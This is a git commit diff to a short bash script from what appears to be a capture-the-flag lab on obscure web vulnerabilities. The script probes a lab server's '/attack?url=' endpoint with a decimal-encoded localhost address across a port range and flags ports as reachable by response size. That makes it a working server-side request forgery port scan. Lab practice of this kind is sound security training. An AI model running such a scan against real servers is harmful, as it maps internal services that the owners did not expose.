7521e4c639889a6b49dba32ef52e263bcf2e63c8
Ulli Weichert <ulli.weichert@cloudsupplies.de>
2021-10-22 22:12:30 +0200

    changes in bash_loop

--- ZTH_Obscure_Web_Vulns/SSRF/attempt.sh
+++ ZTH_Obscure_Web_Vulns/SSRF/attempt.sh
@@ -4,14 +4,17 @@ url="http://10.10.144.204:8000/attack?url="
 param="http%3A%2F%2F2130706433%3A$"
 counter=0
 
-for i in {1..10000}; 
+#for i in {1..10000}; 
+for i in {3303..3310}; 
 	do 
 		echo "Working on Port ${i}"
-		size=$(curl 'http://10.10.144.204:8000/attack?url=http%3A%2F%2F2130706433%3A${i}' -w '%{size_download}' --silent --output /dev/null)
-		if [[ size -gt 1041 ]]
+		size=$(curl http://10.10.144.204:8000/attack?url=http://2130706433:${i} -w %{size_download} --silent --output /dev/null)
+		sleep 3
+		echo "${size}"
+		if [[ size -lt 1045 ]]
 		then
 			echo "Target ${i} seems reachable"
-			counter=${counter} + 1
+			((counter++))
 		fi
 	done
 
